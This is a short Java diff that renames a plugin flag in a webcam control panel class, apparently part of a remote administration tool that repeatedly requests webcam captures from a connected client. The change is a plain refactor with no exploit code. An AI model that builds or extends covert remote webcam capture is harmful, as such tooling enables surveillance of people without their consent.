@@ -65,7 +65,7 @@ public class PanelWebcam extends BaseControlPanel {
 		tglbtnEnable.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				try {
-					Plugin.enabled = true;						
+					WebcamPlugin.enabled = true;						
 					new Thread(new Runnable() {
 						@Override
 						public void run() {
@@ -73,7 +73,7 @@ public class PanelWebcam extends BaseControlPanel {
 								while (true) {
 									getServer().addToSendQueue(new Packet(getServer()));
 									
-									if (!Plugin.enabled) {
+									if (!WebcamPlugin.enabled) {
 										return;
 									}
 									
@@ -188,7 +188,7 @@ public class PanelWebcam extends BaseControlPanel {
 	
 	public void disableCapturing() {
 		try {
-			Plugin.enabled = false;
+			WebcamPlugin.enabled = false;
 			Thread.sleep((int) spInterval.getValue());
 			getServer().addToSendQueue(new Packet(getServer()));
 		} catch (Exception e) {					
